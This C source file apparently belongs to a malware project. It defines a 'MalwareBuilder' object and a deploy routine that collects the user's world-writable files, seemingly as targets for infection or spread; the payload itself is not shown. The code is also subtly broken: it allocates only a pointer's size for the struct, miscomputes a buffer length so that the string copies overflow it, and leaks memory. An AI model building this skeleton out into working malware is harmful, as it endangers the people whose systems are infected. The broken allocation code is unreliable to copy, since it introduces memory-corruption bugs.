#include <stdio.h>
#include <string.h>
#include "malwareBuilder.h"
#include "malwareUtils.h"


MalwareBuilder *malwareBuilder_create(char *defaultRepository,char *defaultExtensionName,char *malwareName){
    
    MalwareBuilder *malware = malloc(sizeof(malware));
    if(malware == NULL) {
        fprintf(stderr, "Failed to allocate memory for Malware\n");
        return NULL;
    }

    malware->defaultRepository = strdup(defaultRepository);
    malware->defaultExtensionName = strdup(defaultExtensionName);
    malware->malwareName = strdup(malwareName);
    char *malwareFullPath = malloc(strlen(getUserCurentDir() + strlen(malwareName) + 1));
    strcpy(malwareFullPath, getUserCurentDir());
    strcat(malwareFullPath, "/");
    strcat(malwareFullPath, malwareName);
    malware->malwarePath = strdup(malwareFullPath);
    printf("%s,%s,%s\n",malware->defaultRepository,malware->defaultExtensionName,malware->malwareName);
    return malware;
}

void malwareBuilder_destroy(MalwareBuilder *app)
{
    free(app);
}

void malwareBuilder_deploy(int argc, char *argv[], MalwareBuilder *malware)
{

    getUserWorldWritableFiles(malware);
    //printf("matching_filename = %s\n",strstr(argv[0], malware->malwareName));

}